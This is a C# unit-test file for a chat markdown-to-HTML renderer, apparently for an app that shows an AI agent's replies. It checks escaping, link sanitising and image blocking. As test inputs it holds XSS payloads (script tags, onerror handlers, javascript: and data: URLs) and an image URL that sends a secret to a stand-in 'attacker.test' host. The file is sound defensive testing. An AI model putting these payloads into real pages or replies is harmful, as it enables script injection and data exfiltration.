using Djohnnie.SoftwareFactory.Web.Components.Shared;

namespace Djohnnie.SoftwareFactory.Web.Tests;

public class ChatMarkdownTests
{
    [Fact]
    public void ToHtml_RendersMarkdown()
    {
        var html = ChatMarkdown.ToHtml("**Done.** I changed:\n\n- the `title`\n- the description");

        Assert.Contains("<strong>Done.</strong>", html);
        Assert.Contains("<li>the <code>title</code></li>", html);
    }

    [Theory]
    [InlineData("<script>alert(1)</script>")]
    [InlineData("<img src=x onerror=alert(1)>")]
    [InlineData("Hi <a href=\"javascript:alert(1)\">there</a>")]
    public void ToHtml_EscapesRawHtml(string markdown)
    {
        var html = ChatMarkdown.ToHtml(markdown);

        Assert.DoesNotContain("<script", html);
        Assert.DoesNotContain("<img", html);
        Assert.DoesNotContain("<a ", html);
        Assert.Contains("&lt;", html);
    }

    [Theory]
    [InlineData("[click](javascript:alert(1))", "click")]
    [InlineData("[data](data:text/html;base64,PHNjcmlwdD4=)", "data")]
    [InlineData("<javascript:alert(1)>", "javascript:alert(1)")]
    public void ToHtml_KeepsTheTextOfUnsafeLinks(string markdown, string text)
    {
        var html = ChatMarkdown.ToHtml(markdown);

        Assert.DoesNotContain("href", html);
        Assert.Contains(text, html);
    }

    [Fact]
    public void ToHtml_RendersTheSubscriptOfTheAgentsHeaderAndFooter()
    {
        var html = ChatMarkdown.ToHtml(
            "<sub>🤖 **DGHSF** on behalf of [djohnnie](https://github.com/djohnnie)</sub>\n\nDone.\n\n<sub>🤖 Revised · run `abc`</sub>\n");

        Assert.Contains("<sub>🤖 <strong>DGHSF</strong> on behalf of <a href=\"https://github.com/djohnnie\"", html);
        Assert.Contains("<sub>🤖 Revised · run <code>abc</code></sub>", html);
        Assert.DoesNotContain("&lt;", html);
    }

    [Theory]
    [InlineData("`<sub>x</sub>`")]
    [InlineData("<sub>one\n\ntwo</sub>")]
    [InlineData("<sub onclick=\"alert(1)\">x</sub>")]
    [InlineData("<sub>x")]
    public void ToHtml_KeepsOtherSubscriptTagsEscaped(string markdown)
    {
        var html = ChatMarkdown.ToHtml(markdown);

        Assert.DoesNotContain("<sub", html);
        Assert.Contains("&lt;sub", html);
    }

    [Fact]
    public void ToHtml_OpensSafeLinksInANewTabWithoutReferrer()
    {
        var html = ChatMarkdown.ToHtml("See [the docs](https://docs.github.com/copilot) or https://github.com.");

        Assert.Contains("href=\"https://docs.github.com/copilot\"", html);
        Assert.Contains("href=\"https://github.com\"", html);
        Assert.Equal(2, html.Split("target=\"_blank\"").Length - 1);
        Assert.Equal(2, html.Split("rel=\"noopener noreferrer nofollow\"").Length - 1);
    }

    [Fact]
    public void ToHtml_TurnsImagesIntoLinks_SoRepliesCantLoadUrls()
    {
        var html = ChatMarkdown.ToHtml("![diagram](https://attacker.test/pixel.png?data=secret) ![](https://attacker.test/x.png)");

        Assert.DoesNotContain("<img", html);
        Assert.Contains(">diagram</a>", html);
        Assert.Contains(">https://attacker.test/x.png</a>", html);
    }

    [Fact]
    public void ToHtml_ShowsTrustedImages_LinkedToTheFullImage()
    {
        const string Shot = "https://storage.test/uploads/shot.png";
        var html = ChatMarkdown.ToHtml($"**The new page**\n\n![The new page]({Shot})\n\n![pixel](https://attacker.test/pixel.png)",
            showImage: url => url.StartsWith("https://storage.test/uploads/", StringComparison.Ordinal));

        Assert.Contains($"<a href=\"{Shot}\" target=\"_blank\" rel=\"noopener noreferrer nofollow\"><img src=\"{Shot}\"", html);
        Assert.Contains("alt=\"The new page\"", html);
        Assert.Contains("loading=\"lazy\"", html);
        Assert.Contains("referrerpolicy=\"no-referrer\"", html);
        Assert.Single(html.Split("<img").Skip(1));
        Assert.Contains(">pixel</a>", html);
    }

    [Fact]
    public void ToHtml_ShowsATrustedImageInALink_WithoutNestingLinks()
    {
        var html = ChatMarkdown.ToHtml("[![shot](https://storage.test/shot.png)](https://github.com/owner/repo)", showImage: _ => true);

        Assert.Contains("<a href=\"https://github.com/owner/repo\"", html);
        Assert.Contains("<img src=\"https://storage.test/shot.png\"", html);
        Assert.Single(html.Split("<a ").Skip(1));
    }

    [Theory]
    [InlineData("/stories/{0}")]
    [InlineData("/epics/{0}")]
    [InlineData("/mindmaps/{0}")]
    public void ToHtml_WithAppLinks_KeepsLinksToWorkItemsAndMindmaps_InTheSameTab(string path)
    {
        var url = string.Format(path, Guid.NewGuid());

        var html = ChatMarkdown.ToHtml($"Open [it]({url}).", allowAppLinks: true);

        Assert.Contains($"href=\"{url}\"", html);
        Assert.Contains("class=\"app-link\"", html);
        Assert.DoesNotContain("target=", html);
    }

    [Fact]
    public void ToHtml_WithAppLinks_TurnsTheGitHubIssueOfAWorkItemIntoALinkToItsPage()
    {
        var story = new Djohnnie.SoftwareFactory.Contracts.WorkItems.WorkItem
        {
            Id = Guid.NewGuid(), Type = Djohnnie.SoftwareFactory.Contracts.WorkItems.WorkItemType.Story, IssueUrl = "https://github.com/owner/repo/issues/12"
        };
        var links = new WorkItemIssueLinks([story]);
        var page = $"/stories/{story.Id}";

        var html = ChatMarkdown.ToHtml(
            "See [Pay by card](https://github.com/owner/repo/issues/12), https://github.com/Owner/Repo/issues/12/ and " +
            "[the comment](https://github.com/owner/repo/issues/12#issuecomment-1), but [another](https://github.com/owner/repo/issues/13).",
            allowAppLinks: true, appLinkFor: links.PageFor);

        Assert.Equal(3, html.Split($"href=\"{page}\"").Length - 1);
        Assert.Contains(">Pay by card</a>", html);
        Assert.Contains("href=\"https://github.com/owner/repo/issues/13\" target=\"_blank\"", html);
        Assert.DoesNotContain("href=\"https://github.com/owner/repo/issues/12", html);

        var withoutAppLinks = ChatMarkdown.ToHtml("[Pay by card](https://github.com/owner/repo/issues/12)", appLinkFor: links.PageFor);
        Assert.Contains("href=\"https://github.com/owner/repo/issues/12\"", withoutAppLinks);
    }

    [Theory]
    [InlineData("/stories/{0}")]
    [InlineData("/epics/new")]
    [InlineData("/stories/{0}/generate")]
    [InlineData("/stories/{0}?x=1")]
    [InlineData("//attacker.test/stories/{0}")]
    [InlineData("/internal-agents")]
    [InlineData("/unknown/{0}")]
    public void ToHtml_DropsOtherRelativeLinks_AndAppLinksUnlessAllowed(string path)
    {
        var url = string.Format(path, Guid.NewGuid());
        var allow = path != "/stories/{0}";

        var html = ChatMarkdown.ToHtml($"Open [it]({url}).", allowAppLinks: allow);

        Assert.DoesNotContain("href", html);
        Assert.Contains("it", html);
    }
}
